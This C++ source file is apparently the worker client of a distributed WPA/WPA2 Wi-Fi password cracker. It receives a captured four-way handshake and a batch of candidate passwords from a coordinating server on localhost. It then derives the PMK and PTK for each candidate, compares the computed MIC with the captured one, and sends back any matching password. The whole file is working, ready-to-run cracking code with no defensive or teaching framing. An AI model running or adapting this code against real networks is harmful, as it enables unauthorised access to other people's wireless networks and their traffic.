#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <algorithm>
#pragma comment(lib, "ws2_32.lib")

using ByteVector = std::vector<uint8_t>;

std::string bytesToHexString(const ByteVector& data) {
    std::ostringstream oss;
    for (auto b : data)
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)b;
    return oss.str();
}

bool isLessThan(const ByteVector& a, const ByteVector& b) {
    return std::lexicographical_compare(a.begin(), a.end(), b.begin(), b.end());
}

ByteVector customPRF512(const ByteVector& key, const std::string& A, const ByteVector& B) {
    ByteVector R;
    for (int i = 0; i < 4; ++i) {
        ByteVector data;
        data.insert(data.end(), A.begin(), A.end());
        data.push_back(0x00);
        data.insert(data.end(), B.begin(), B.end());
        data.push_back(i);

        unsigned char result[SHA_DIGEST_LENGTH];
        unsigned int len = SHA_DIGEST_LENGTH;
        HMAC(EVP_sha1(), key.data(), key.size(), data.data(), data.size(), result, &len);

        R.insert(R.end(), result, result + len);
    }
    R.resize(64);
    return R;
}

ByteVector generatePMK(const std::string& password, const std::string& ssid) {
    ByteVector pmk(32);
    PKCS5_PBKDF2_HMAC(password.c_str(), password.length(),
        reinterpret_cast<const unsigned char*>(ssid.c_str()), ssid.length(),
        4096, EVP_sha1(), 32, pmk.data());
    return pmk;
}

void receiveHandshakeAndPasswords(SOCKET sock,
    ByteVector& ap_mac, ByteVector& client_mac,
    ByteVector& anonce, ByteVector& snonce,
    ByteVector& captured_mic, ByteVector& eapol_frame,
    std::string& ssid, std::vector<std::string>& passwords)
{
    std::cout << "[*] Receiving handshake parameters and password chunk...\n";

    auto receiveVector = [&](ByteVector& vec) {
        uint32_t size;
        recv(sock, reinterpret_cast<char*>(&size), sizeof(size), 0);
        vec.resize(size);
        int received = 0;
        while (received < size) {
            int ret = recv(sock, reinterpret_cast<char*>(vec.data()) + received, size - received, 0);
            if (ret <= 0) throw std::runtime_error("Failed to receive vector data.");
            received += ret;
        }
        };

    receiveVector(ap_mac);
    receiveVector(client_mac);
    receiveVector(anonce);
    receiveVector(snonce);
    receiveVector(captured_mic);
    receiveVector(eapol_frame);

    uint32_t ssid_size;
    recv(sock, reinterpret_cast<char*>(&ssid_size), sizeof(ssid_size), 0);
    std::vector<char> ssid_buf(ssid_size);
    int rec = 0;
    while (rec < (int)ssid_size) {
        int r = recv(sock, ssid_buf.data() + rec, ssid_size - rec, 0);
        if (r <= 0) throw std::runtime_error("Failed to receive SSID.");
        rec += r;
    }
    ssid = std::string(ssid_buf.begin(), ssid_buf.end());

    uint32_t pw_size;
    recv(sock, reinterpret_cast<char*>(&pw_size), sizeof(pw_size), 0);
    std::vector<char> pw_buf(pw_size);
    rec = 0;
    while (rec < (int)pw_size) {
        int r = recv(sock, pw_buf.data() + rec, pw_size - rec, 0);
        if (r <= 0) throw std::runtime_error("Failed to receive password chunk.");
        rec += r;
    }

    std::istringstream iss(std::string(pw_buf.begin(), pw_buf.end()));
    std::string line;
    while (std::getline(iss, line)) {
        if (!line.empty())
            passwords.push_back(line);
    }

    std::cout << "[+] Received handshake and " << passwords.size() << " passwords\n";
}

void printHandshake(const ByteVector& ap_mac, const ByteVector& client_mac,
    const ByteVector& anonce, const ByteVector& snonce,
    const ByteVector& captured_mic, const ByteVector& eapol_frame,
    const std::string& ssid)
{
    std::cout << "\n=== Handshake Parameters (Client Side) ===\n";
    std::cout << "SSID         : " << ssid << "\n";
    std::cout << "AP MAC       : " << bytesToHexString(ap_mac) << "\n";
    std::cout << "Client MAC   : " << bytesToHexString(client_mac) << "\n";
    std::cout << "ANonce       : " << bytesToHexString(anonce) << "\n";
    std::cout << "SNonce       : " << bytesToHexString(snonce) << "\n";
    std::cout << "Captured MIC : " << bytesToHexString(captured_mic) << "\n";
    std::cout << "EAPOL Frame  : " << eapol_frame.size() << " bytes\n";
    std::cout << "===========================================\n";
}

void crackPasswords(SOCKET sock, const std::vector<std::string>& passwords,
    const ByteVector& ap_mac, const ByteVector& client_mac,
    const ByteVector& anonce, const ByteVector& snonce,
    const ByteVector& captured_mic, const ByteVector& eapol_frame,
    const std::string& ssid)
{
    std::cout << "[*] Starting crack loop...\n";
    const std::string A = "Pairwise key expansion";
    ByteVector B;

    if (isLessThan(ap_mac, client_mac)) {
        B.insert(B.end(), ap_mac.begin(), ap_mac.end());
        B.insert(B.end(), client_mac.begin(), client_mac.end());
    }
    else {
        B.insert(B.end(), client_mac.begin(), client_mac.end());
        B.insert(B.end(), ap_mac.begin(), ap_mac.end());
    }
    if (isLessThan(anonce, snonce)) {
        B.insert(B.end(), anonce.begin(), anonce.end());
        B.insert(B.end(), snonce.begin(), snonce.end());
    }
    else {
        B.insert(B.end(), snonce.begin(), snonce.end());
        B.insert(B.end(), anonce.begin(), anonce.end());
    }

    size_t total = passwords.size();
    for (size_t idx = 0; idx < total; ++idx) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        timeval tv{ 0, 0 };
        if (select(0, &readfds, nullptr, nullptr, &tv) > 0) {
            char cmd[16];
            int n = recv(sock, cmd, sizeof(cmd) - 1, 0);
            if (n > 0) {
                cmd[n] = '\0';
                if (strcmp(cmd, "STOP") == 0) {
                    std::cout << "[*] Received STOP from server. Aborting crack loop.\n";
                    return;
                }
            }
        }

        const std::string& password = passwords[idx];
        if (password.empty()) continue;

        ByteVector pmk = generatePMK(password, ssid);
        ByteVector ptk = customPRF512(pmk, A, B);

        unsigned char mic_res[SHA_DIGEST_LENGTH];
        unsigned int mic_len = SHA_DIGEST_LENGTH;
        HMAC(EVP_sha1(), ptk.data(), 16,
            eapol_frame.data(), (unsigned)eapol_frame.size(),
            mic_res, &mic_len);

        std::string calc_mic = bytesToHexString(ByteVector(mic_res, mic_res + 16));
        std::string want_mic = bytesToHexString(captured_mic);

        if (idx % 25 == 0) {
            std::cout << "[*] Progress: " << (idx + 1) << "/" << total
                << " : Testing '" << password << "'\n";
        }

        if (calc_mic == want_mic) {
            std::string found_msg = "FOUND:" + password;
            send(sock, found_msg.c_str(), (int)found_msg.length(), 0);
            std::cout << "\n[+] Password FOUND at attempt " << (idx + 1)
                << ": '" << password << "'\n";
            return;
        }
    }

    std::cout << "[-] Exhausted all " << total << " passwords. No match found.\n";
}

int main() {
    try {
        std::cout << "[*] Initializing Winsock...\n";
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
            throw std::runtime_error("WSAStartup failed.");

        std::cout << "[*] Creating socket...\n";
        SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (client_socket == INVALID_SOCKET)
            throw std::runtime_error("Socket creation failed.");

        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(9999);
        inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

        std::cout << "[*] Connecting to server 127.0.0.1:9999...\n";
        if (connect(client_socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
            throw std::runtime_error("Connection to server failed.");

        std::cout << "[+] Connected to server.\n";

        ByteVector ap_mac, client_mac, anonce, snonce, captured_mic, eapol_frame;
        std::string ssid;
        std::vector<std::string> passwords;

        receiveHandshakeAndPasswords(
            client_socket,
            ap_mac, client_mac, anonce, snonce,
            captured_mic, eapol_frame,
            ssid, passwords
        );

        printHandshake(
            ap_mac, client_mac,
            anonce, snonce,
            captured_mic, eapol_frame,
            ssid
        );

        crackPasswords(
            client_socket,
            passwords,
            ap_mac, client_mac,
            anonce, snonce,
            captured_mic, eapol_frame,
            ssid
        );

        std::cout << "[*] Cleaning up and exiting.\n";
        closesocket(client_socket);
        WSACleanup();
    }
    catch (const std::exception& ex) {
        std::cerr << "ERROR: " << ex.what() << "\n";
        return 1;
    }
    return 0;
}